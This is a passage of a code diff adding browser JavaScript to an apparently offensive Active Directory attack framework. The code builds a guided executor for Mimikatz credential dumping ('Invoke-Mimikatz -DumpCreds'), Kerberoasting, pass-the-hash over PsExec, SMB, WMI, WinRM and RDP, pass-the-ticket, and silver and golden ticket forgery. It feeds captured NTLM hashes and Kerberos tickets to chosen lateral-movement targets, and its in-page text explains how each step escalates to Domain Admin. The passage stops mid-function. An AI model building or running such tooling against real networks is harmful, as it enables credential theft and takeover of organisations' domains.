+  const executorInitialSetupModal = new bootstrap.Modal('#executorInitialSetupModal', {})
+  const queryString = window.location.search;
+  const urlParams = new URLSearchParams(queryString);
+  if (urlParams.has("isFromInitialSetup")) {
+    displayExecutorSettings();
+    executorInitialSetupModal.show();
+
+    // remove the parameter, so the modal won't show again after the user refresh the page
+    window.history.replaceState(null, "", window.location.pathname);
+  }
+});
+
+const isObjectEmpty = (objectName) => {
+  return (
+    objectName &&
+    Object.keys(objectName).length === 0 &&
+    objectName.constructor === Object
+  );
+};
+
+function displayTargetIpAddressOutput() {
+  var outputTargetIpAddressValue = document.getElementById("outputTargetIpAddress").value;
+
+  const targetIpAddresses = [];
+  const targetIpAddressOptions = document.querySelectorAll("option[name=outputTargetIpAddresses]");
+  targetIpAddressOptions.forEach((option) => {
+    targetIpAddresses.push(option.value);
+  });
+
+  targetIpAddresses.forEach((targetIpAddress) => {
+    var outputTargetIpAddressDiv = document.getElementById(`outputTargetIpAddress-${targetIpAddress}`);
+    if (targetIpAddress == outputTargetIpAddressValue) {
+      outputTargetIpAddressDiv.style.display = "";
+    } else {
+      outputTargetIpAddressDiv.style.display = "none";
+    }
+  });
+}
+
+function getAllTargetIpAddresses() {
+  var targetIpAddresses = [];
+  var targetIpAddressCheckBoxes = document.querySelectorAll("option[name=outputTargetIpAddresses]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    targetIpAddresses.push(checkBox.value);
+  });
+
+  return targetIpAddresses
+}
+
+function getAllAgents() {
+  var agentIds = [];
+  for (var i = 0; i < stepThreeAgentSelect.options.length; i++) {
+    if (stepThreeAgentSelect.options[i].value !== "none") {
+      agentIds.push(stepThreeAgentSelect.options[i].value);
+    }
+  }
+
+  return agentIds;
+}
+
+function getSelectedAgents() {
+  var agentIds = [];
+  for (var i = 0; i < stepThreeAgentSelect.options.length; i++) {
+    if (stepThreeAgentSelect.options[i].selected && stepThreeAgentSelect.options[i].value !== "none") {
+      agentIds.push(stepThreeAgentSelect.options[i].value);
+    }
+  }
+
+  return agentIds;
+}
+
+function displayAllMimikatzCommand(command) {
+  var targetIpAddresses = getAllTargetIpAddresses();
+  targetIpAddresses.forEach((targetIpAddress) => {
+    var mimikatzCommandCodeBlock = document.getElementById(`mimikatzCommand-${targetIpAddress}`);
+    mimikatzCommandCodeBlock.dataset.highlighted = "";
+    mimikatzCommandCodeBlock.innerText = command;
+    hljs.highlightElement(mimikatzCommandCodeBlock);
+  });
+}
+
+function displayMimikatzCommand(command) {
+  var targetIpAddresses = getTargetIpAddresses();
+  targetIpAddresses.forEach((targetIpAddress) => {
+    var mimikatzCommandCodeBlock = document.getElementById(`mimikatzCommand-${targetIpAddress}`);
+    mimikatzCommandCodeBlock.dataset.highlighted = "";
+    mimikatzCommandCodeBlock.innerText = command;
+    hljs.highlightElement(mimikatzCommandCodeBlock);
+  });
+}
+
+function updateExecutorProgessBar(currentValue, goalValue) {
+  const percentage = Math.ceil((currentValue / goalValue) * 100);
+
+  executorProgress = `${percentage}%`;
+  executorProgressBar.style.width = executorProgress;
+  executorProgressBar.innerText = executorProgress;
+}
+
+function resetSteps() {
+  isStepTwoCompleted = false;
+  isStepThreeCompleted = false;
+
+  chooseParameterBodyDiv.innerHTML = "";
+  command = "";
+  displayAllMimikatzCommand(command);
+  editMimikatzCommandTextarea.value = command;
+
+  var targetIpAddressCheckBoxes = document.querySelectorAll("input[name=targetIpAddress]");
+  targetIpAddressCheckBoxes.forEach((checkBox) => {
+    if (checkBox.checked) {
+      checkBox.checked = false;
+    }
+  });
+
+  stepThreeButtonElement.disabled = true;
+  stepThreeButtonElement.setAttribute("class", "accordion-button bg-secondary collapsed text-light font-weight-bold fs-5");
+}
+
+function cleanStepThreeAgentOptions() {
+  stepThreeAgentSelect.innerHTML = "";
+}
+
+async function initializeStepThreeAgent() {
+  stepThreeAgentDiv.style.display = "none";
+
+  var response = await fetch("/api/getAllAgentsId");
+  var result = await response.json();
+  var agents = result["allAgents"];
+
+  if (isObjectEmpty(agents)) {
+    return;
+  }
+
+  var isMimikatzSetup = false;
+  var agentsEntries = Object.entries(agents);
+  agentsEntries.map( ([agentId, agentInformation] = entry) => {
+    if (agentInformation["isMimikatzSetup"] === true) {
+      isMimikatzSetup = true;
+    }
+  });
+
+  if (isMimikatzSetup){
+    stepThreeAgentSelect.innerHTML = "";
+    var newDefaultOptionTag = document.createElement("option");
+    newDefaultOptionTag.setAttribute("value", "none");
+    newDefaultOptionTag.setAttribute("hidden", "hidden");
+    newDefaultOptionTag.setAttribute("disabled", "disabled");
+    newDefaultOptionTag.innerText = "Select Agent(s)";
+    stepThreeAgentSelect.appendChild(newDefaultOptionTag);
+
+    agentsEntries.map( ([agentId, agentInformation] = entry) => {
+      var user = agentInformation["user"];
+      var targetIpAddress = agentInformation["targetIpAddress"];
+
+      var newOptionTag = document.createElement("option");
+      newOptionTag.setAttribute("value", agentId);
+      newOptionTag.setAttribute("style", "overflow-x: scroll;");
+      newOptionTag.innerText = `Agent ID: ${agentId} (User: ${user} | IP Address ${targetIpAddress})`;
+      stepThreeAgentSelect.appendChild(newOptionTag);
+    });
+
+    stepThreeAgentDiv.style.display = "";
+  }
+}
+
+async function readTicketFileAsDataURL(ticketFile) {
+  return new Promise((resolve, reject) => {
+    const ticketFileReader = new FileReader();
+    ticketFileReader.addEventListener("load", (event) => {
+      var dataUrl = event.target.result;
+      var base64Content = dataUrl.split(",")[1];
+      resolve(base64Content);
+    });
+    ticketFileReader.addEventListener("error", (event) => {
+      reject(event.error);
+    });
+    ticketFileReader.readAsDataURL(ticketFile);
+  });
+}
+
+function selectFunction(attackPathFunctionSelectValue) {  
+  resetSteps();
+  cleanStepThreeAgentOptions();
+  stepThreeAgentDiv.style.display = "none";
+
+  functionName = attackPathFunctionSelectValue;
+  functionDescriptionDiv.style.display = "none";
+  switch(functionName) {
+    case "credentialDumping":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used to dump the target's local Windows recently logged-in users' credentials and automatically try to crack the dumped password hash(es) so you can obtain the cleartext password(s).<br><br>This is very useful for escalating your privilege to other domain users or Domain Admin (DA) accounts, as you can dump the password hashes of recently logged-in users. With those hashes, you can continue to crack them or perform Pass-the-Hash technique.<br><br>Note: This function requires the <code>SeDebugPrivilege</code> user privilege to dump the credentials of the local machine.`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(2, 3);
+      initializeChooseParameters(functionName);
+      initializeStepThreeAgent();
+      break;
+    case "kerberoasting":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used when you have a valid Kerberos TGT (Ticket Granting Ticket), such as when you are authenticated as a domain user. It allows you to request Kerberos TGS (Ticket Granting Service) tickets for service accounts that may have weak passwords and are vulnerable to brute force attacks.<br><br>Since service accounts usually have elevated privileges, if you can forge the TGS ticket and impersonate the service account (also known as Silver Ticket Attack), you can escalate your privilege as the service account.<br><br>To identify a service account, you need to find all domain users' SPNs (Service Principal Names). Fortunately, the application has already done this job for you.<br><br>Therefore, you can request TGS tickets and crack the service account's password offline.`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(1, 3);
+      initializeChooseParameters(functionName);
+      initializeStepThreeAgent();
+      break;
+    case "passTheHash":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used when you have captured an NTLM password hash of an account. It allows you to leverage Pass-the-Hash (PtH) attack to authenticate and gain lateral access to other systems.<br><br>With this attack function, you can authenticate as another account when you have its NTLM password hash.`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(1, 4);
+      initializeChooseParameters(functionName);
+      break;
+    case "passTheTicket":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used when you have obtained Kerberos ticket(s) for account(s). It allows you to use the ticket(s) to authenticate and gain lateral access to other systems.<br><br>With this attack function, you can authenticate as another account when you have its Kerberos ticket.`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(1, 3);
+      initializeChooseParameters(functionName);
+      initializeStepThreeAgent();
+      break;
+    case "silverTicketAttack":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used when you have cracked/cleartext password of a service account. It allows you to impersonate and authenticate as the service account.<br><br>To obtain the service account password, you need to perform a Kerberoasting attack. Fortunately, the application has already done this job for you.`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(1, 4);
+      initializeChooseParameters(functionName);
+      initializeStepThreeAgent();
+      break;
+    case "goldenTicketAttack":
+      functionDescriptionDiv.style.display = "";
+      functionDescriptionTextDiv.innerHTML = `This function is used when you have the KRBTGT account's password hash. It allows you to create forged Kerberos tickets on the domain. This is because the KRBTGT account's password is used to encrypt and decrypt Kerberos tickets.<br><br>With this attack function, you can forge a Kerberos ticket as a Domain Admin (DA).`;
+      isAttackPathFunctionSelected = true;
+      updateExecutorProgessBar(1, 5);
+      initializeChooseParameters(functionName);
+      initializeStepThreeAgent();
+      break;
+  }
+
+  isStepOneCompleted = isAttackPathFunctionSelected;
+  if (isStepOneCompleted) {
+    var stepOneButtonElement = document.getElementById("stepOneButton");
+    stepOneButtonElement.setAttribute("class", "accordion-button bg-success collapsed text-light font-weight-bold fs-5");
+    var stepTwoButtonElement = document.getElementById("stepTwoButton");
+    stepTwoButtonElement.disabled = false;
+    stepTwoButtonElement.setAttribute("class", "accordion-button bg-danger collapsed text-light font-weight-bold fs-5");
+  }
+}
+
+async function initializeChooseParameters(functionName) {
+    stepThreeTargetIpAddressDiv.style.display = "";
+    chooseParameterTitle.innerText = "Choose Parameter(s) For Attack Function \"{ functionName }\"";
+
+    switch(functionName) {
+      case "credentialDumping":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Dump Recently Logged on Accounts\' Password (Mimikatz sekurlsa::logonpasswords)");
+        chooseParameterTitle.innerText = newTitleText;
+        chooseParameterBodyDiv.innerHTML = `<p class="mt-4">This attack function does not require any parameters. You may proceed to the final step: "Step 3 &mdash; Execute".</p>`;
+        isStepTwoCompleted = true;
+
+        // this sleep is required as there's a race condition in the below "isStepTwoCompleted" if statement
+        await sleep(100);
+        command = "Invoke-Mimikatz -DumpCreds";
+        displayAllMimikatzCommand(command);
+        editMimikatzCommandTextarea.value = command;
+        break;
+      case "kerberoasting":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Extract & Crack Service Accounts' Password (Kerberoasting)");
+        chooseParameterTitle.innerText = newTitleText;
+        
+        var response = await fetch("/api/getSettings");
+        var result = await response.json();
+        var domain = Object.keys(result["settings"]["targetDomain"])[0];
+        
+        if (isObjectEmpty(result["settings"]["targetDomain"])) {
+          chooseParameterBodyDiv.innerHTML = `<p class="mt-4">No domains have been found.</p>`;
+          break;
+        }
+
+        var kerberoastableServiceAccounts = result["settings"]["targetDomain"][domain]["kerberoastableServiceAccounts"];
+        if (isObjectEmpty(kerberoastableServiceAccounts)) {
+          chooseParameterBodyDiv.innerHTML = `<p class="mt-4">Could not find any Kerberoastable service accounts.</p>`;
+          break;
+        }
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select Service Account(s):";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        /*
+          <p class="mb-0">
+            <span onchange="selectTargetIpAddresses()">
+              <input type="checkbox" id="{{ targetIpAddress }}" name="targetIpAddress" value="{{ targetIpAddress }}">
+              <label for="{{ targetIpAddress }}" class="m-2">{{ targetIpAddress }}</label>
+            </span>
+          </p>
+        */
+        var newP = document.createElement("p");
+        newP.setAttribute("class", "mb-0");
+        newP.setAttribute("onchange", `chooseParameters("${functionName}")`);
+
+        var kerberoastableServiceAccountsEntries = Object.entries(kerberoastableServiceAccounts);
+        kerberoastableServiceAccountsEntries.map( ([key, val] = entry) => {
+          var serviceAccountUsername = key;
+          // we're only getting the first SPN
+          var servicePrincipalNames = val["servicePrincipalNames"];
+          var servicePrincipalName = servicePrincipalNames[0];
+          var services = [];
+          servicePrincipalNames.forEach((spn) => {
+            services.push(spn.split("/")[0]);
+          });
+          var formattedServices = services.join(", ");
+
+          var newSpan = document.createElement("span");
+
+          var newInput = document.createElement("input");
+          newInput.setAttribute("type", "checkbox");
+          newInput.setAttribute("name", "kerberoastingServiceAccountCheckBoxes");
+          newInput.setAttribute("id", key);
+          newInput.setAttribute("value", servicePrincipalName);
+
+          newSpan.appendChild(newInput);
+
+          var newLabel = document.createElement("label");
+          newLabel.setAttribute("for", key);
+          newLabel.setAttribute("class", "m-2");
+          if (services.length > 1) {
+            newLabel.innerText = `Username: ${serviceAccountUsername} (Services: ${formattedServices})`;
+          } else {
+            newLabel.innerText = `Username: ${serviceAccountUsername} (Service: ${formattedServices})`;
+          }
+
+          newSpan.appendChild(newLabel);
+
+          var newBr = document.createElement("br");
+          newSpan.appendChild(newBr);
+
+          newP.appendChild(newSpan);
+        });
+
+        chooseParameterBodyDiv.appendChild(newP);
+        break;
+      case "passTheHash":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Password Hash Authentication (Pass-the-Hash)");
+        chooseParameterTitle.innerText = newTitleText;
+
+        var response = await fetch("/api/getSettings");
+        var result = await response.json();
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select an Account:";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newSelectTag = document.createElement("select");
+        newSelectTag.setAttribute("class", "form-select");
+        newSelectTag.setAttribute("id", "passTheHashAccount");
+        newSelectTag.setAttribute("onchange", `chooseParameters("${functionName}")`);
+        var newDefaultOptionTag = document.createElement("option");
+        newDefaultOptionTag.setAttribute("value", "none");
+        newDefaultOptionTag.setAttribute("selected", "selected");
+        newDefaultOptionTag.setAttribute("disabled", "disabled");
+        newDefaultOptionTag.setAttribute("hidden", "hidden");
+        newDefaultOptionTag.innerText = "Select an Account";
+        newSelectTag.appendChild(newDefaultOptionTag);
+
+        var isCurrentSessionRdpOrVnc = false;
+        var generalSettings = Object.entries(result["settings"]["generalSettings"]);
+        generalSettings.map( ([key, val] = entry) => {
+          if (val["currentSession"] === "rdpOrVnc") {
+            isCurrentSessionRdpOrVnc = true;
+          }
+        });
+
+        var kerberoastableServiceAccountsArray = [];
+        var domainUsers = [];
+        var targetDomain = Object.entries(result["settings"]["targetDomain"]);
+        targetDomain.map( ([key, val] = entry) => {
+          var kerberoastableServiceAccounts = Object.entries((val["kerberoastableServiceAccounts"]));
+          kerberoastableServiceAccounts.map( ([key, val] = entry) => {
+            kerberoastableServiceAccountsArray.push(key);
+          });
+
+          domainUsers.push((Object.keys(val["users"])));
+        });
+
+        var usernameEntries = Object.entries(result["settings"]["executor"]);
+        usernameEntries.map( ([key, val] = entry) => {
+          var username = key;
+          // excluding kerberoastable service accounts
+          if (kerberoastableServiceAccountsArray.includes(username)) {
+            return;
+          }
+
+          var isLocalUser = false;
+          domainUsers.forEach((users) => {
+            if (!users.includes(username)) {
+              isLocalUser = true;
+            }
+          });
+
+          var ntlmHash = val["ntlm"];
+          var domain = val["domain"];
+          if (ntlmHash !== "(No NTLM password hash)") {
+            var newOptionTag = document.createElement("option");
+            newOptionTag.setAttribute("name", "passtheHashOptions");
+            newOptionTag.setAttribute("value", username);
+            newOptionTag.setAttribute("data-ntlmHash", ntlmHash);
+            newOptionTag.setAttribute("data-domain", domain);
+            newOptionTag.setAttribute("data-isLocalUser", isLocalUser);
+
+            newOptionTag.innerText = `Username: ${username} (Domain: ${domain})`;
+            newSelectTag.appendChild(newOptionTag);
+          }
+        });
+
+        chooseParameterBodyDiv.appendChild(newSelectTag);
+
+        var lateralMovementTargetIpAddresses = [];
+        var targetComputerIpAddresses = Object.keys(result["settings"]["targetComputer"]);
+        var targetDomainEntries = Object.entries(result["settings"]["targetDomain"]);
+        targetDomainEntries.map( ([key, val] = entry) => {
+          var computerEntries = Object.entries(val["computers"]);
+          computerEntries.map( ([key2, val2] = entry) => {
+            lateralMovementTargetIpAddresses.push(val2["ipAddress"]);
+          });
+        });
+
+        targetComputerIpAddresses.forEach((targetIpAddress) => {
+          var isDifferentTargetIpAddress = !lateralMovementTargetIpAddresses.includes(targetIpAddress);
+          if (isDifferentTargetIpAddress) {
+            lateralMovementTargetIpAddresses.push(targetIpAddress);
+          }
+        });
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Choose Lateral Movement Target(s):";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        /*
+        <span onchange=`chooseParameters("${functionName}")`>
+          <input type="checkbox" id=`lateralMovementTarget-${targetIpAddress}` name="lateralMovementTargets" value="targetIpAddress">
+          <label for=`lateralMovementTarget-${targetIpAddress}` class="m-2">targetIpAddress</label>
+        </span>
+        */
+        lateralMovementTargetIpAddresses.forEach((targetIpAddress) => {
+          var span = document.createElement("span");
+          span.setAttribute("onchange", `chooseParameters("${functionName}")`);
+
+          var input = document.createElement("input");
+          input.setAttribute("type", "checkbox");
+          input.setAttribute("id", `lateralMovementTarget-${targetIpAddress}`);
+          input.setAttribute("name", "lateralMovementTargets");
+          input.setAttribute("value", targetIpAddress);
+          input.setAttribute("checked", "checked");
+          span.appendChild(input);
+
+          var label = document.createElement("label");
+          label.setAttribute("for", `lateralMovementTarget-${targetIpAddress}`);
+          label.setAttribute("class", "m-2");
+          label.innerText = targetIpAddress;
+          span.appendChild(label);
+
+          chooseParameterBodyDiv.appendChild(span);
+        });
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select Pass-the-Hash Method(s):";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newP = document.createElement("p");
+        newP.setAttribute("class", "mb-0");
+        newP.setAttribute("onchange", `chooseParameters("${functionName}")`);
+
+        var passTheHashMethods = ["Mimikatz", "PsExec", "RDP", "SMB", "WinRM", "WMI"];
+        passTheHashMethods.forEach((method) => {
+          var newSpan = document.createElement("span");
+
+          var newInput = document.createElement("input");
+          newInput.setAttribute("type", "checkbox");
+          newInput.setAttribute("name", "passTheHashMethodCheckboxes");
+          newInput.setAttribute("id", method);
+          newInput.setAttribute("value", method);
+          newInput.setAttribute("checked", "checked");
+
+          newSpan.appendChild(newInput);
+
+          var newLabel = document.createElement("label");
+          newLabel.setAttribute("for", method);
+          newLabel.setAttribute("class", "m-2");
+          var passTheHashMethods = ["Mimikatz", "PsExec", "RDP", "SMB", "WinRM", "WMI"];
+          if (method === "Mimikatz") {
+            newLabel.innerHTML = "Mimikatz (sekurlsa::pth) <mark><b>(Only executes on the current session machine)</b></mark>";
+          } else if (method === "PsExec") {   
+            newLabel.innerText = `${method} (Impacket-PsExec)`;
+          } else if (method === "RDP") {
+            newLabel.innerHTML = `${method} (Impacket-RDP_Check, xfreerdp) <mark><b>(Requires disabling "Restricted Admin Mode")</b></mark>`;
+          } else if (method === "SMB") {
+            newLabel.innerText = `${method} (Impacket-SMBExec)`;
+          } else if (method === "WinRM") {
+            newLabel.innerText = `${method} (Evil-WinRM)`;
+          } else if (method === "WMI") {
+            newLabel.innerText = `${method} (Impacket-WMIExec)`;
+          }
+
+          newSpan.appendChild(newLabel);
+
+          var newBr = document.createElement("br");
+          newSpan.appendChild(newBr);
+
+          newP.appendChild(newSpan);
+        });
+
+        chooseParameterBodyDiv.appendChild(newP);
+
+        stepThreeTargetIpAddressDiv.style.display = "none";
+
+        chooseParameters(functionName);
+        break;
+      case "passTheTicket":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Kerberos Ticket Authentication (Pass-the-Ticket)");
+        chooseParameterTitle.innerText = newTitleText;
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title");
+        newPTag.innerText = "Upload Kerberos Ticket(s):";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newInputTag = document.createElement("input");
+        newInputTag.setAttribute("class", "form-control");
+        newInputTag.setAttribute("type", "file");
+        newInputTag.setAttribute("accept", ".kirbi");
+        newInputTag.setAttribute("multiple", "multiple");
+        newInputTag.setAttribute("onchange", `chooseParameters("${functionName}")`);
+        newInputTag.setAttribute("id", "passTheTicketFileForm");
+        chooseParameterBodyDiv.appendChild(newInputTag);
+
+        var response = await fetch("/api/getSettings");
+        var result = await response.json();
+        var executorEntries = Object.entries(result["settings"]["executor"]);
+
+        var hasTicket = false;
+
+        var userTickets = {};
+        var ticketInformaton = [];
+        var hasSilverTicket = false;
+        var hasGoldenTicket = false;
+        var hasAnyTickets = false;
+        executorEntries.map( ([username, userDetails] = entry) => {
+          hasSilverTicket = (("silverTicket" in userDetails));
+          hasGoldenTicket = (("goldenTicket" in userDetails));
+          hasAnyTickets = (("tickets" in userDetails));
+
+          if (hasSilverTicket || hasGoldenTicket || hasAnyTickets) {
+            hasTicket = true;
+
+            if (hasSilverTicket) {
+              var tickets = userDetails.silverTicket.tickets;
+            } else if (hasGoldenTicket) {
+              var tickets = userDetails.goldenTicket.tickets;
+            } else if (hasAnyTickets) {
+              var tickets = userDetails.tickets;
+            }
+
+            tickets.forEach((ticket) => {
+              if (hasSilverTicket || hasAnyTickets) {
+                var service = ticket.service;
+                var target = ticket.target;
+              }
+              var base64TgsTicket = ticket.base64TgsTicket.replace(/(\r\n|\n|\r)/gm, "");
+              var domain = ticket.domain;
+
+              userTickets[username] = [];
+              if (hasSilverTicket || hasAnyTickets) {
+                if (hasSilverTicket) {
+                  ticketInformaton.push({ username, service, target, base64TgsTicket, "ticketType": "silverTicket" });
+                } else if (hasAnyTickets) {
+                  ticketInformaton.push({ username, service, target, base64TgsTicket, "ticketType": "ticket" });
+                }
+              } else if (hasGoldenTicket) {
+                ticketInformaton.push({ username, domain, base64TgsTicket, "ticketType": "goldenTicket" });
+              }
+            });
+          }
+        });
+
+        if (hasTicket) {
+          var newPTag = document.createElement("p");
+          newPTag.setAttribute("class", "card-title")
+          newPTag.innerText = "Select Kerberos Ticket(s): (Optional)";
+          chooseParameterBodyDiv.appendChild(newPTag);
+
+          var newSelectTag = document.createElement("select");
+          newSelectTag.setAttribute("class", "form-select");
+          newSelectTag.setAttribute("id", "passTheTicketTicket");
+          newSelectTag.setAttribute("multiple", "multiple");
+          newSelectTag.setAttribute("onchange", `chooseParameters("${functionName}")`);
+          var newDefaultOptionTag = document.createElement("option");
+          newDefaultOptionTag.setAttribute("value", "none");
+          newDefaultOptionTag.setAttribute("selected", "selected");
+          newDefaultOptionTag.setAttribute("disabled", "disabled");
+          newDefaultOptionTag.setAttribute("hidden", "hidden");
+          newDefaultOptionTag.innerText = "Select a Kerberos Ticket";
+          newSelectTag.appendChild(newDefaultOptionTag);        
+
+          ticketInformaton.forEach((ticket) => {
+            var username = ticket["username"];
+            var service = ticket["service"];
+            var target = ticket["target"];
+            var domain = ticket["domain"];
+            var base64TgsTicket = ticket["base64TgsTicket"];
+            var ticketType = ticket["ticketType"];
+
+            if (ticketType === "silverTicket" || ticketType === "ticket") {
+              userTickets[username].push({ username, service, target, base64TgsTicket, "ticketType": ticketType });
+            } else if (ticketType === "goldenTicket") {
+              userTickets[username].push({ username, domain, base64TgsTicket, "ticketType": ticketType });
+            }
+          });
+
+          var userTicketsEntries = Object.entries(userTickets);
+          userTicketsEntries.map( ([username, ticketInformation] = entry) => {
+            var newOptgroupTag = document.createElement("optgroup");
+            newOptgroupTag.setAttribute("label", `Username: ${username}`);
+
+            ticketInformation.forEach((ticket) => {
+              var ticketType = ticket["ticketType"];
+
+              var newOptionTag = document.createElement("option");
+              newOptionTag.setAttribute("name", "passTheTicketTicketOptions");
+              newOptionTag.setAttribute("value", username);
+              // newOptionTag.setAttribute("data-service", ticket.service);
+              // newOptionTag.setAttribute("data-target", ticket.target);
+              newOptionTag.setAttribute("data-base64TgsTicket", ticket.base64TgsTicket);
+
+              if (ticketType === "silverTicket" || ticketType === "ticket") {
+                newOptionTag.innerText = `Service: ${ticket.service} | FQDN: ${ticket.target} (From Executor)`;
+              } else if (ticketType === "goldenTicket") {
+                newOptionTag.innerText = `Domain: ${ticket.domain} (From Executor)`;
+              }
+
+              newOptgroupTag.appendChild(newOptionTag);
+            });
+            newSelectTag.appendChild(newOptgroupTag);
+          });
+
+          chooseParameterBodyDiv.appendChild(newSelectTag);
+
+          var passTheTicketReminderAlert = `<div class="alert alert-primary d-flex align-items-center mt-4" role="alert">
+            <i class="bi bi-info-circle me-2"></i>
+            <div>Note: You can either upload <b>OR</b> select Kerberos ticket(s).</div>
+          </div>`;
+          chooseParameterBodyDiv.innerHTML += passTheTicketReminderAlert;
+        }
+        break;
+      case "silverTicketAttack":
+        newTitleText = chooseParameterTitle.innerText.replace("{ functionName }", "Impersonate Service Accounts (Silver Ticket Attack)");
+        chooseParameterTitle.innerText = newTitleText;
+
+        var response = await fetch("/api/getSettings");
+        var result = await response.json();
+        var domain = Object.keys(result["settings"]["targetDomain"])[0];
+        
+        if (isObjectEmpty(result["settings"]["targetDomain"])) {
+          chooseParameterBodyDiv.innerHTML = `<p class="mt-4">No domains have been found.</p>`;
+          break;
+        }
+
+        var kerberoastableServiceAccounts = result["settings"]["targetDomain"][domain]["kerberoastableServiceAccounts"];
+        if (isObjectEmpty(kerberoastableServiceAccounts)) {
+          chooseParameterBodyDiv.innerHTML = `<p class="mt-4">Could not find any Kerberoastable service accounts.</p>`;
+          break;
+        }
+
+        var domainSid = result["settings"]["targetDomain"][domain]["domainSid"];
+
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select a Service Account:";
+        chooseParameterBodyDiv.appendChild(newPTag);
+
+        var newSelectTag = document.createElement("select");
+        newSelectTag.setAttribute("class", "form-select");
+        newSelectTag.setAttribute("id", "kerberoastingServiceAccountSilverTicket");
+        newSelectTag.setAttribute("onchange", `chooseParameters("${functionName}")`);
+        var newDefaultOptionTag = document.createElement("option");
+        newDefaultOptionTag.setAttribute("value", "none");
+        newDefaultOptionTag.setAttribute("selected", "selected");
+        newDefaultOptionTag.setAttribute("disabled", "disabled");
+        newDefaultOptionTag.setAttribute("hidden", "hidden");
+        newDefaultOptionTag.innerText = "Select a Service Account";
+        newSelectTag.appendChild(newDefaultOptionTag);
+
+        // only display cracked TGS ticket service accounts
+        var crackedKerberoastableServiceAccounts = [];
+        var kerberoastableServiceAccountsUsername = Object.keys(kerberoastableServiceAccounts);
+        var executorEntries = Object.entries(result["settings"]["executor"]);
+        executorEntries.map( ([username, executorInformation] = entry) => {
+          for (let serviceAccountUsername of kerberoastableServiceAccountsUsername) {
+            if (serviceAccountUsername === username && executorInformation["kerberoasting"] !== undefined) {
+              var crackedStatus = executorInformation["kerberoasting"]["status"];
+              if (crackedStatus === "Cracked") {
+                crackedKerberoastableServiceAccounts.push(serviceAccountUsername);
+              }
+            }
+          }
+        });
+
+        var kerberoastableServiceAccountsEntries = Object.entries(kerberoastableServiceAccounts);
+        await Promise.all(kerberoastableServiceAccountsEntries.map(async ([key, val] = entry) => {
+          if (crackedKerberoastableServiceAccounts.includes(key)) {
+            var serviceAccountUsername = key;
+            var servicePrincipalNames = val["servicePrincipalNames"];
+            var services = [];
+            var targets = [];
+            servicePrincipalNames.forEach((spn) => {
+              var service = spn.split("/")[0];
+              var target = spn.split("/")[1].split(":")[0];
+              services.push(service);
+              targets.push(target);
+            });
+            var formattedServices = services.join(", ");
+            var formattedTargets = targets.join(", ");
+
+            var ntlmHash;
+            if (result["settings"]["executor"][serviceAccountUsername]["kerberoasting"]) {
+              if (result["settings"]["executor"][serviceAccountUsername]["kerberoasting"]["status"] === "Cracked") {
+                ntlmHash = result["settings"]["executor"][serviceAccountUsername]["kerberoasting"]["ntlmHash"];
+              }
+            }
+
+            var newOptionTag = document.createElement("option");
+            newOptionTag.setAttribute("value", formattedServices);
+            newOptionTag.setAttribute("data-domain", domain);
+            newOptionTag.setAttribute("data-sid", domainSid);
+            // the username is a fake user, so the username can be random.
+            // But we'll just use the account's username anyway.
+            // const FAKE_USERNAME = "Administrator";
+            // newOptionTag.setAttribute("data-user", FAKE_USERNAME);
+            newOptionTag.setAttribute("data-user", serviceAccountUsername);
+            newOptionTag.setAttribute("data-target", formattedTargets);
+            newOptionTag.setAttribute("data-service", formattedServices);
+
+            newOptionTag.setAttribute("data-rc4", ntlmHash);
+            if (services.length > 1) {
+              newOptionTag.innerText = `Username: ${serviceAccountUsername} (Services: ${formattedServices})`;
+            } else {
+              newOptionTag.innerText = `Username: ${serviceAccountUsername} (Service: ${formattedServices})`;
+            }
+            newSelectTag.appendChild(newOptionTag);
+          }
+        }));
+
+        chooseParameterBodyDiv.appendChild(newSelectTag);
+
+        /*
+        <div onchange="chooseParameters(functionName)">
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="silverTicketExportOption" id="useNow" value="silverTicketUseNow">
+            <label class="form-check-label" for="useNow">
+              Use the forged TGS ticket now (Pass-the-Ticket) (Recommended)
+            </label>
+          </div>
+          <div class="form-check">
+            <input class="form-check-input" type="radio" name="silverTicketExportOption" id="exportTicket" value="silverTicketExport">
+            <label class="form-check-label" for="exportTicket">
+              Export the forged TGS ticket for future use
+            </label>
+          </div>
+        </div>
+        */
+        var newPTag = document.createElement("p");
+        newPTag.setAttribute("class", "card-title")
+        newPTag.innerText = "Select an Usage Option:";
+        chooseParameterBodyDiv.appendChild(newPTag);
+        // Create the outer div
+        var outerDiv = document.createElement('div');
+
+        // Set the onchange attribute
+        outerDiv.setAttribute('onchange', `chooseParameters("${functionName}")`);
+
+        // Create the first form-check div
+        var formCheckDiv1 = document.createElement('div');
+        formCheckDiv1.setAttribute('class', 'form-check');
+
+        // Create the first radio input
